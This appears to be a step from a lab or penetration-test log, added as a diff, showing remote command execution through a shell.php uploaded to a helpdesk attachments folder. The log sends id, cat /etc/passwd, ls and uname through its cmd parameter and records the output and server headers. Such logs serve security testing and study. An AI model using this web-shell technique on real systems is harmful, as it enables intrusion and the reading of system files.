@@ -1,0 +1,63 @@
+###### Part B1 (step 4): web shell RCE ######
+
+>>> REQUEST: GET /media/helpdesk/attachments/support-9-4c296f6b-d8b0-4429-8e95-b118d4bcda3e/6/shell.php?cmd=id
+>>> RESPONSE:
+uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)
+
+>>> REQUEST: GET /media/helpdesk/attachments/support-9-4c296f6b-d8b0-4429-8e95-b118d4bcda3e/6/shell.php?cmd=cat%20/etc/passwd
+>>> RESPONSE:
+root:x:0:0:root:/root:/bin/sh
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+www-data:x:82:82::/home/www-data:/sbin/nologin
+
+>>> REQUEST: GET /media/helpdesk/attachments/support-9-4c296f6b-d8b0-4429-8e95-b118d4bcda3e/6/shell.php?cmd=ls%20-la%20/
+>>> RESPONSE:
+total 64
+drwxr-xr-x    1 root     root          4096 Oct 12 17:57 .
+drwxr-xr-x    1 root     root          4096 Oct 12 17:57 ..
+-rwxr-xr-x    1 root     root             0 Oct 12 17:57 .dockerenv
+drwxr-xr-x    1 root     root          4096 Sep 25 17:45 bin
+drwxr-xr-x    5 root     root           340 Oct 12 17:57 dev
+drwxr-xr-x    1 root     root          4096 Oct 12 17:57 etc
+drwxr-xr-x    1 root     root          4096 Sep 25 17:42 home
+drwxr-xr-x    1 root     root          4096 Sep 17 17:32 lib
+drwxr-xr-x    5 root     root          4096 Sep 17 17:32 media
+drwxr-xr-x    2 root     root          4096 Sep 17 17:32 mnt
+drwxr-xr-x    2 root     root          4096 Sep 17 17:32 opt
+dr-xr-xr-x  381 root     root             0 Oct 12 17:57 proc
+drwx------    2 root     root          4096 Sep 17 17:32 root
+drwxr-xr-x    3 root     root          4096 Sep 17 17:32 run
+drwxr-xr-x    2 root     root          4096 Sep 17 17:32 sbin
+drwxr-xr-x    1 root     root          4096 Oct 12 17:57 srv
+dr-xr-xr-x   11 root     root             0 Oct 12 17:57 sys
+drwxrwxrwt    2 root     root          4096 Sep 17 17:32 tmp
+drwxr-xr-x    1 root     root          4096 Sep 25 17:45 usr
+drwxr-xr-x    1 root     root          4096 Sep 25 17:42 var
+
+>>> REQUEST: GET /media/helpdesk/attachments/support-9-4c296f6b-d8b0-4429-8e95-b118d4bcda3e/6/shell.php?cmd=uname%20-a
+>>> RESPONSE:
+Linux ea3b40f4a29f 6.10.14-linuxkit #1 SMP PREEMPT_DYNAMIC Wed Sep 10 06:48:35 UTC 2025 x86_64 Linux
+>>> response headers for ?cmd=id:
+HTTP/1.1 200 OK
+Server: nginx/1.27.5
+Date: Mon, 12 Oct 2026 18:27:42 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: keep-alive
+X-Powered-By: PHP/8.3.35
+Content-Length: 67
+
